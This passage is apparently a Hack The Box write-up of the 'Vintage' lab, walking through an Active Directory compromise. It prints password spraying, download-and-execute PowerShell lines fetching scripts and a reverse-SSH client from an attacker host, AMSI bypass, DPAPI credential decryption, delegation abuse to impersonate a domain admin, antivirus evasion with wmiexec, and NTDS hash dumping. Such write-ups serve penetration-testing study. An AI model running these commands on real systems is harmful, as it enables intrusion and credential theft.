3e39df10a4ec00b94abf492e37612502bc26da2d356e93b451365c4e78a308d030a9c7d1ec0d3e98d5ec375fe34d81b57dc4d39ef8e929cafd1911f8e596e9e1b2a1e7782ab75d50df5f1a7826c6dc94581f4b9e61f22a795349080c58016ec2adb9df051673a49baf3633849b58ce38b9e9e2ad8d0d61ef82fc6d877255d2119c202699478c455a05c6feddd17c563faeaa556ca98a440cc0962ab18f6934705b20285e1a142ec85d8a19214a3063383ba2e9065520da14cc96b5901e09a5ebb6df8411cb010a149a2ff38e359511a321b439b838388506c19da866c04e73b23053e722608392a357340433fa1eefa66ad667431929cde7a6908c261c5d37e6b0247ec0e498bf348cbee2ba88566877b12f799ca195eb37d7b6b77ca93547b62212a3e6213520a38b17811754b4eb3d9702ffa63f4d9a08703dd114adeffa827c7fa6ce59709e754c0424d16c5354c1a57c5c84764b7796778f786a79c30f53da3ef798157a447c80af12a592adda25fa73c6ab0cef4a6e77dd4d52c70df09d030ec0a33319569b6ab985a26d251003bda91497dbce8a41f8fd614a6fc685c69890911f7ab029f37a8b2ee0d04c431e7b969f5ab31a2587a7785b5c45fd8430eef3070a0e6f29b9f602cb60b524536415dd877c9830398b86eb484fe18c825aeddd26cd150f65ee8cbfb722611db25c5905c6b412df633bd8db3b2388fba81168eeb261ea1e79afc3fbcbc0513ca9d652c957f14b3416e31cae514723a259ee68b305f5dbed234b15a738968bb470bd232a76323662b1aaab6d82ee69a5db946bc89504e9462961f52856c487cf092c62687d4f385d287d1c044db14085ceb8ca6308f0433b28e33892f3446d9d39ee062e18eeb527fb75131d1785b85bc2109976542a1b:Zer0the0ne
[...]
```

Validated that the authentication is successful

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ nxc smb -k $(pt get rhost) -u 'svc_sql' -p 'Zer0the0ne'
SMB         DC01.vintage.htb 445    DC01             [*]  x64 (name:DC01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         DC01.vintage.htb 445    DC01             [+] vintage.htb\svc_sql:Zer0the0ne
```


## Shell as C.Neri

### Password spray

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ nxc smb -k $(pt get rhost) -u ldeep/_users_enabled.lst -p 'Zer0the0ne' --continue-on-success
SMB         DC01.vintage.htb 445    DC01             [*]  x64 (name:DC01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\L.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\C.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\svc_ark:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\svc_ldap:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [+] vintage.htb\C.Neri:Zer0the0ne
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\Administrator:Zer0the0ne KDC_ERR_PREAUTH_FAILED
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ pt set user 'C.Neri'; pt set pass 'Zer0the0ne'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
C.Neri:Zer0the0ne
```


### 5985 - Winrm

- `C.Neri` is in the `REMOTE MANAGEMENT USERS` group, which allows it to **winrm** into the domain computers

Request a TGT

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"; pt set ticket $(realpath "$(pt get user).ccache")
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in C.Neri.ccache
```

Get a shell via **WINRM**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ KRB5CCNAME="$(pt get ticket)" evil-winrm -r $(pt get domain) -i $(pt get dc_fqdn)

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents> whoami
vintage\c.neri
*Evil-WinRM* PS C:\Users\C.Neri\Documents> cat C:\Users\C.Neri\Desktop\user.txt
ba5767768777e66866c46d799e19bd43
```

# Root Flag
---

## Auth as c.neri_adm


### Reverse SSH - Interactive shell

> Run [reverse_ssh](https://github.com/NHAS/reverse_ssh) client with [logon type 9](https://learn.microsoft.com/windows-server/identity/securing-privileged-access/reference-tools-logon-types) via [RunasCs](https://github.com/antonioCoco/RunasCs) to gain full access to **WMI**
{: .prompt-info }

`Invoke-RunasCs.ps1` was blocked by **AMSI**

```bash
*Evil-WinRM* PS C:\Users\C.Neri> iex (new-object net.webclient).DownloadString('http://10.10.14.90:80/Invoke-RunasCs.ps1')
At line:1 char:1
+ function Invoke-RunasCs
+ ~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
At line:1 char:1
+ iex (new-object net.webclient).DownloadString('http://10.10.14.90:80/ ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```

Use **evil-winrm**'s built-in command to bypass **AMSI** and patch **ETW** easily

```bash
Bypass-4MSI
```

![](/assets/obsidian/f57679fde34c11de38d60a474df3fdb4.png)

> Manual bypass method was written in [Additional -> Bypass AMSI & disable ETW manually](#Additional#Bypass%20AMSI%20&%20disable%20ETW%20manually) section at the end of writeup
{: .prompt-tip }

Download and run **reverse_ssh** client

```bash
*Evil-WinRM* PS C:\Users\C.Neri\Documents> (new-object System.Net.WebClient).DownloadFile('http://10.10.14.90:80/client.exe', '\programdata\client.exe')
*Evil-WinRM* PS C:\Users\C.Neri\Documents> iex (new-object net.webclient).DownloadString('http://10.10.14.90:80/Invoke-RunasCs.ps1'); Invoke-RunasCs -LogonType 9 -Username "x" -Password "x" -Command "C:\programdata\client.exe"

2025/03/21 14:04:02 setting ll:  1
2025/03/21 14:04:02 Forking
```

![](/assets/obsidian/887c78b09b981076fb77caa7666e4fa9.png)

Connect to **RSSH** client

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ ssh -J 127.0.0.1:443 vintage.c.neri.dc01
Warning: Permanently added 'vintage.c.neri.dc01' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32>
```


### Enumeration

- `C.Neri` has low privileges

```powershell
PS C:\Users\C.Neri\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

- There are some data protected with **DPAPI**, `LastWriteTime` was around the time when the machine was released

```bash
PS C:\Windows\system32> ls -fo -r -file $env:LocalAppData\Microsoft\Credentials\, $env:AppData\Microsoft\Credentials\ | select Mode,@{N='Owner'; E={$_.GetAccessControl().Owner}},LastWriteTime,Length,FullName | sort LastWriteTime | ft -wrap

Mode   Owner          LastWriteTime       Length FullName
----   -----          -------------       ------ --------
-a-hs- VINTAGE\C.Neri 6/7/2024 1:17:08 PM  11020 C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
-a-hs- VINTAGE\C.Neri 6/7/2024 5:08:23 PM    430 C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6
```


### Dumping DPAPI secrets

> Refer - https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets

List **masterkeys** from `C:\Users\<Username>\appdata\Microsoft\Protect\`, which are the ones with `GUID` as file name

```bash
PS C:\Windows\system32> ls -fo -r -file $env:appdata\Microsoft\Protect\ | select Mode,@{N='Owner'; E={$_.GetAccessControl().Owner}},LastWriteTime,Length,FullName | sort LastWriteTime | ft -wrap

Mode   Owner          LastWriteTime         Length FullName
----   -----          -------------         ------ --------
-a-hs- VINTAGE\C.Neri 6/7/2024 1:17:07 PM      904 C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\BK-VINTAGE
-a-hs- VINTAGE\C.Neri 6/7/2024 1:17:07 PM       24 C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\CREDHIST
-a-hs- VINTAGE\C.Neri 6/7/2024 1:17:07 PM      740 C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs- VINTAGE\C.Neri 6/7/2024 1:17:07 PM       76 C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\SYNCHIST
-a-hs- VINTAGE\C.Neri 3/22/2025 12:54:29 PM    740 C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs- VINTAGE\C.Neri 3/22/2025 8:49:56 PM     740 C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\43b04018-c58c-4e6f-ae43-36384797e90c
-a-hs- VINTAGE\C.Neri 3/22/2025 8:49:56 PM      24 C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\Preferred
```

We will dump the whole folder since files such as [CREDHIST](https://tools.thehacker.recipes/mimikatz/modules/dpapi/credhist) are valuable

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ scp -J 127.0.0.1:443 -r "$SESSION":"$(FILE='C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect'; echo "${FILE//\\//}")" ./loot/
CREDHIST                                                                                                                                                                       100%   24     0.1KB/s   00:00
43b04018-c58c-4e6f-ae43-36384797e90c                                                                                                                                           100%  740     3.7KB/s   00:00
4dbf04d8-529b-4b4c-b4ae-8e875e4fe847                                                                                                                                           100%  740     4.1KB/s   00:00
99cf41a3-a552-4cf7-a8d7-aca2d6f7339b                                                                                                                                           100%  740     3.9KB/s   00:00
BK-VINTAGE                                                                                                                                                                     100%  904     5.0KB/s   00:00
Preferred                                                                                                                                                                      100%   24     0.1KB/s   00:00
SYNCHIST        
```

Dump all DPAPI-protected data

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ scp -J 127.0.0.1:443 -r "$SESSION":"$(FILE='C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\'; echo "${FILE//\\//}")" ./loot/; scp -J 127.0.0.1:443 -r "$SESSION":"$(FILE='C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\'; echo "${FILE//\\//}")" ./loot/
C4BB96844A5C9DD45D5B6A9859252BA6                                                                                                                                               100%  430     2.3KB/s   00:00
DFBE70A7E5CC19A398EBF1B96859CE5D                                                                                                                                               100%   11KB  54.4KB/s   00:00
```

Attempt to decrypt the dumped **masterkeys** with user's password until it succeed

```bash
PASS='Zer0the0ne'
MASTERKEYS="$(find loot/Protect/ -type f | grep -E '[[:xdigit:]]{8}(-[[:xdigit:]]{4}){3}-[[:xdigit:]]{12}')"
SID="$(echo "$MASTERKEYS" | head -n1 | rev | cut -d'/' -f 2 | rev)"
echo "$MASTERKEYS" | while read -r f; do
    r=$(dpapi.py masterkey -sid "$SID" -file "$f" -password "$PASS")
    echo "$r" | grep -q 'Decrypted key' && echo "$r"
done
```

- Output

```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
```

Decrypted all DPAPI-protected data and got the credential : `c.neri_adm:Uncr4ck4bl3P4ssW0rd0312` 

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ KEY='0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a'; FILES="$(find loot/Credentials -type f)"; echo "$FILES" | while read -r f; do dpapi.py credential -file "$f" -key "$KEY"; done
[...]
[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description :
Unknown     :
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
```

Validated that the authentication was successful

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ nxc smb -k $(pt get rhost) -u 'c.neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312'
SMB         DC01.vintage.htb 445    DC01             [*]  x64 (name:DC01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         DC01.vintage.htb 445    DC01             [+] vintage.htb\c.neri_adm:Uncr4ck4bl3P4ssW0rd0312
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ pt set user 'c.neri_adm'; pt set pass 'Uncr4ck4bl3P4ssW0rd0312'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
c.neri_adm:Uncr4ck4bl3P4ssW0rd0312
```


## Shell as administrator


### Delegations - Resource-Based Constrained Delegations (RBCD)

We can abuse [**Resource-Based Constrained Delegations** (RBCD)](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) to impersonate domain administrator on **DC01** as a member of `DELEGATEDADMINS` group

![](/assets/obsidian/9715ffc4b95ff716c02ef3a4a3b8ba5e.png)

Only accounts that Kerberos can consider as a service (with **SPN** set or machine accounts) can abuse `S4U2SELF/S4U2proxy`, we can add `fs01$` (which we know its password) to `DELEGATEDADMINS` group since `C.NERI_ADM` has `GenericWrite` rights to `DELEGATEDADMINS` group

![](/assets/obsidian/6c44034b456b33969905fd12128e0bfd.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u 'c.neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' -k add groupMember 'DELEGATEDADMINS' 'fs01$'
[+] fs01$ added to DELEGATEDADMINS
```

Request a service ticket to access **cifs** (Old name of SMB) service on `DC01.vintage.htb` on behalf of `administrator` via **S4U2Self** and **S4U2Proxy** chain

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ getST.py -spn 'cifs/DC01.vintage.htb' -impersonate 'Administrator' 'vintage.htb/fs01$:fs01' -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.vintage.htb@VINTAGE.HTB.ccache
```

`Administrator` don't have access to SMB shares, so **wmiexec** failed at executing commands via administrative shares (`ADMIN$`, `C$`, `IPC$`)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ pt set ticket $(realpath Administrator@cifs_DC01.vintage.htb@VINTAGE.HTB.ccache)

┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ KRB5CCNAME="$(pt get ticket)" wmiexec.py -k -shell-type powershell $(pt get rhost)
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] SMB SessionError: code: 0xc000015b - STATUS_LOGON_TYPE_NOT_GRANTED - A user has requested a type of logon (for example, interactive or network) that has not been granted. An administrator has control over who may logon interactively and through the network.

┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ KRB5CCNAME="$(pt get ticket)" nxc smb $(pt get dc_fqdn) --use-kcache --shares
SMB         DC01.vintage.htb 445    DC01             [*]  x64 (name:DC01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\ from ccache STATUS_LOGON_TYPE_NOT_GRANTED
SMB         DC01.vintage.htb 445    DC01             [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```

Impersonate the domain administrator `L.Bianchi_adm` instead

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ getST.py -spn 'cifs/DC01.vintage.htb' -impersonate 'L.Bianchi_adm' 'vintage.htb/fs01$:fs01' -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating L.Bianchi_adm
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in L.Bianchi_adm@cifs_DC01.vintage.htb@VINTAGE.HTB.ccache
```

Now we can access administrative shares on SMB

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ pt set ticket $(realpath L.Bianchi_adm@cifs_DC01.vintage.htb@VINTAGE.HTB.ccache)

┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ KRB5CCNAME="$(pt get ticket)" nxc smb $(pt get dc_fqdn) --use-kcache --shares
SMB         DC01.vintage.htb 445    DC01             [*]  x64 (name:DC01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         DC01.vintage.htb 445    DC01             [+] vintage.htb\L.Bianchi_adm from ccache (Pwn3d!)
SMB         DC01.vintage.htb 445    DC01             [*] Enumerated shares
SMB         DC01.vintage.htb 445    DC01             Share           Permissions     Remark
SMB         DC01.vintage.htb 445    DC01             -----           -----------     ------
SMB         DC01.vintage.htb 445    DC01             ADMIN$          READ,WRITE      Remote Admin
SMB         DC01.vintage.htb 445    DC01             C$              READ,WRITE      Default share
SMB         DC01.vintage.htb 445    DC01             IPC$            READ            Remote IPC
SMB         DC01.vintage.htb 445    DC01             NETLOGON        READ,WRITE      Logon server share
SMB         DC01.vintage.htb 445    DC01             SYSVOL          READ,WRITE      Logon server share
```

Use **wmiexec.py** with `-nooutput` and `-silentcommand` flags to run **RSSH** client in order to bypass antivirus (Antivirus/EDR matches signatures of default command output filenames and arguments passed with `cmd.exe` from **wmiexec.py**)

![](/assets/obsidian/537fee317b0a0482cf44f11cc882c5d7.png)

![](/assets/obsidian/539dc69fcf72b8bd4a0aa505d6814775.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ KRB5CCNAME="$(pt get ticket)" wmiexec.py -k $(pt get rhost) '\programdata\client.exe' -nooutput -silentcommand
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
```

![](/assets/obsidian/0871406f2bff01c1727cc7a5174e59b1.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ ssh -J 127.0.0.1:443 unknown.dc01
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\> whoami
vintage\l.bianchi_adm
PS C:\> cat C:\Users\Administrator\Desktop\root.txt
220c68cb1814f4105db0a3a1314c9c33
PS C:\>
```

# Additional
---

## Post exploitation


### Secrets

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ KRB5CCNAME="$(pt get ticket)" nxc smb $(pt get dc_fqdn) --use-kcache -M ntdsutil -o DIR_RESULT='nxc_ntds'
SMB         DC01.vintage.htb 445    DC01             [*]  x64 (name:DC01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         DC01.vintage.htb 445    DC01             [+] vintage.htb\L.Bianchi_adm from ccache (Pwn3d!)
NTDSUTIL    DC01.vintage.htb 445    DC01             [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\174268249
NTDSUTIL    DC01.vintage.htb 445    DC01             Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    DC01.vintage.htb 445    DC01             [+] NTDS.dit dumped to C:\Windows\Temp\174268249
NTDSUTIL    DC01.vintage.htb 445    DC01             [*] Copying NTDS dump to /home/kali/htb/Vintage/nxc_ntds
NTDSUTIL    DC01.vintage.htb 445    DC01             [*] NTDS dump copied to /home/kali/htb/Vintage/nxc_ntds
NTDSUTIL    DC01.vintage.htb 445    DC01             [+] Deleted C:\Windows\Temp\174268249 remote dump directory
NTDSUTIL    DC01.vintage.htb 445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    DC01.vintage.htb 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
NTDSUTIL    DC01.vintage.htb 445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    DC01.vintage.htb 445    DC01             DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
NTDSUTIL    DC01.vintage.htb 445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::
NTDSUTIL    DC01.vintage.htb 445    DC01             gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:51434c5b357ff89c5f85d994a27f7339:::
NTDSUTIL    DC01.vintage.htb 445    DC01             FS01$:1108:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::
NTDSUTIL    DC01.vintage.htb 445    DC01             M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::
NTDSUTIL    DC01.vintage.htb 445    DC01             R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::
NTDSUTIL    DC01.vintage.htb 445    DC01             L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::
NTDSUTIL    DC01.vintage.htb 445    DC01             G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
NTDSUTIL    DC01.vintage.htb 445    DC01             C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
NTDSUTIL    DC01.vintage.htb 445    DC01             P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::
NTDSUTIL    DC01.vintage.htb 445    DC01             svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
NTDSUTIL    DC01.vintage.htb 445    DC01             svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:458fd9b330df2eff17c42198627169aa:::
NTDSUTIL    DC01.vintage.htb 445    DC01             svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
NTDSUTIL    DC01.vintage.htb 445    DC01             C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::
NTDSUTIL    DC01.vintage.htb 445    DC01             L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::
NTDSUTIL    DC01.vintage.htb 445    DC01             [+] Dumped 17 NTDS hashes to /home/kali/.nxc/logs/DC01_DC01.vintage.htb_2025-03-23_062813.ntds of which 14 were added to the database
NTDSUTIL    DC01.vintage.htb 445    DC01             [*] To extract only enabled accounts from the output file, run the following command:
NTDSUTIL    DC01.vintage.htb 445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/DC01_DC01.vintage.htb_2025-03-23_062813.ntds | cut -d ':' -f1
NTDSUTIL    DC01.vintage.htb 445    DC01             [*] Raw NTDS dump copied to /home/kali/htb/Vintage/nxc_ntds, parse it with:
NTDSUTIL    DC01.vintage.htb 445    DC01             [*] secretsdump.py -system '/home/kali/htb/Vintage/nxc_ntds/registry/SYSTEM' -security '/home/kali/htb/Vintage/nxc_ntds/registry/SECURITY' -ntds '/home/kali/htb/Vintage/nxc_ntds/Active Directory/ntds.dit' LOCAL
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ KRB5CCNAME="$(pt get ticket)" donpapi collect -t $(pt get rhost) -k
[💀] [+] DonPAPI Version 2.0.1
[💀] [+] Output directory at /home/kali/.donpapi
[💀] [+] Loaded 1 targets
[💀] [+] Recover file available at /home/kali/.donpapi/recover/recover_1742683420
[DC01.vintage.htb] [+] Starting gathering credz
[DC01.vintage.htb] [+] Dumping SAM
[06:44:01] ERROR    SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.                                                                      secretsdump.py:1340
[DC01.vintage.htb] [$] [SAM] Got 3 accounts
[DC01.vintage.htb] [+] Dumping LSA
[DC01.vintage.htb] [+] Dumping User and Machine masterkeys
[DC01.vintage.htb] [$] [DPAPI] Got 7 masterkeys
[DC01.vintage.htb] [+] Dumping User Chromium Browsers
[DC01.vintage.htb] [+] Dumping User and Machine Certificates
[...]
[DC01.vintage.htb] [+] Dumping User and Machine Credential Manager
[DC01.vintage.htb] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{C880A25A-72A4-41E7-ACA6-B3E33D2DA500} - VINTAGE\Administrator:Kekkerolli123
[DC01.vintage.htb] [+] Gathering recent files and desktop files
[DC01.vintage.htb] [+] Dumping User Firefox Browser
[DC01.vintage.htb] [+] Dumping MobaXterm credentials
[DC01.vintage.htb] [+] Dumping MRemoteNg Passwords
[DC01.vintage.htb] [+] Dumping User's RDCManager
[DC01.vintage.htb] [+] Dumping SCCM Credentials
[DC01.vintage.htb] [+] Dumping User and Machine Vaults
[DC01.vintage.htb] [+] Dumping VNC Credentials
[DC01.vintage.htb] [+] Dumping Wifi profiles
DonPAPI running against 1 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

### Files

```bash

```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```


## House cleaning

> The house-cleaning portion of the assessment ensures that remnants of the penetration test are removed. Often times, fragments of tools or user accounts are left on an organization’s computer, which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is paramount importance.
{: .prompt-info }

```bash
bloodyAD --host $(pt get rhost) -d $(pt get domain) -u 'gMSA01$' -p '51434c5b357ff89c5f85d994a27f7339' -k -f rc4 remove groupMember 'SERVICEMANAGERS' 'gMSA01$'
bloodyAD --host $(pt get rhost) -d $(pt get domain) -u 'gMSA01$' -p '51434c5b357ff89c5f85d994a27f7339' -k -f rc4 add uac 'svc_sql' -f 'ACCOUNTDISABLE'
bloodyAD --host $(pt get rhost) -d $(pt get domain) -u 'c.neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' -k remove groupMember 'DELEGATEDADMINS' 'fs01$'
```


## Bypass AMSI & disable ETW manually

1. **AMSI (Antimalware Scan Interface)** can be bypassed by forcing an error to make `amsiInitFailed()` return true, and patching `AmsiScanBuffer()` from `amsi.dll` and `clr.dll`
2. **ETW (Event Tracing for Windows)** can be disabled in current process by setting an internal `.NET` field (`m_enabled`) inside the `System.Diagnostics.Eventing.EventProvider` to `0`

**AMSI** at **powershell** level can be bypassed easily via [Matt Graebers Reflection method](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#using-matt-graebers-reflection-method). After that, we can run other **powershell** scripts without the need of obfuscation since windows defender lost the interface to scan the commands.

> - We are just gonna use payloads generated from [amsi.fail](https://amsi.fail/) since the windows defender version on the machine is obsolete (Not publishing custom payloads to avoid AV signaturing)
> - More **AMSI** bypass related payloads can be found and customized from [https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) and [https://github.com/V-i-x-x/AMSI-BYPASS](https://github.com/V-i-x-x/AMSI-BYPASS/tree/main) to avoid signature matching
{: .prompt-info }

![](/assets/obsidian/03ff9cd1d0835368ab3ae784d8d2cd54.png)

```bash
